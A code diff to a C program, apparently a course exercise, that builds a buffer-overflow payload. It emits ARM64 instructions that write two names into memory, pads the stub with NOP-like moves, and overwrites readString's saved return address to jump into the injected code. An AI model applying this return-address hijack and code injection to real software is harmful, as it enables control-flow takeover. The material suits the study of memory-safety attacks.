@@ -52,13 +52,27 @@ int main(void)
     fwrite(&instr, 4, 1, f);  pc += 4;
 
 
+    for (i = 0; i < 24; i++) { 
+        instr = MiniAssembler_mov(0, (int)"Ben Zhou and Owen Clarke"[i]);
+        fwrite(&instr, 4, 1, f);
+        pc+=4; 
+
+        instr = MiniAssembler_adr(2, 396 + i, pc); 
+        fwrite(&instr, 4, 1, f); 
+        pc+=4; 
+
+        instr = MiniAssembler_strb(0, 2); 
+        fwrite(&instr, 4, 1, f); 
+        pc+=4; 
+    }
 
     /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
     for (; pc < NAME_ADDR + 24; pc += 4) {
         instr = MiniAssembler_mov(0, 0);
         fwrite(&instr, 4, 1, f);
     }
-    fprintf(f, "Ben Zhou and Owen Clarke");
+
+
 
 
     /* 3) Overwrite readString’s saved x30 with NAME_ADDR
